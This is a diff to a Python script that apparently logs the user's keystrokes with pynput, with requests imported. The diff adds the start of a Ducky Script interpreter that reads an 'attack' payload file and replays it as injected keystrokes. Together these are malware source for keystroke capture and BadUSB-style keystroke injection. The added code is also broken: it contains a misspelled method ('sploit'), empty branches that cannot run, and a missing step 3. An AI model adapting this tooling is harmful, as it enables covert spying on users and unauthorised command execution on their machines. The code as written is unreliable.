@@ -1,9 +1,51 @@
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Key, Listener, Controller
 
 import requests
 
+controlador = Controller()
+
 # Lista que almacena todas las pulsaciones del usuario
 teclas_presionadas = []
+
+# 1. Ayudara a leer un archivo que contenga el pauyload que valmos a realiozar
+
+def leer_ataque(nombre_archivo):
+
+    # Abrir un archivo de tipo txt que contenga el ataque
+    with open( nombre_archivo, "r" ) as file:
+
+        comandos = []
+
+        lineas = file.readlines()
+
+        for linea in lineas:
+            linea = linea.strip()
+
+            if linea == "" or linea.startswith("//"):
+                continue # Ignora las linea que esten vacias o que sean comentarios
+            comandos.append(traducir_comandos(linea))
+
+        return comandos
+
+# 2. Convertira el ducky script a comandos que python pueda entender
+def traducir_comandos(linea):
+    # Separamos los comandos en dos partes
+    partes = linea.sploit(" ")
+
+    # La primera parte de ese comando lo ponemos en mayusculas
+    comando = partes[0].upper()
+
+    argumentos = partes[1:]
+
+    if comando == "STRING":
+        #Mi codigo tiene que escribir algo
+    elif comando == "DELAY":
+
+    elif comando == "ENTER":
+
+
+# 3. Ejecutara el payload ya transcrito en python
+
 
 #Creamos una funcion que se encargue de abrir el documento salida.txt
 def leer_archivo():
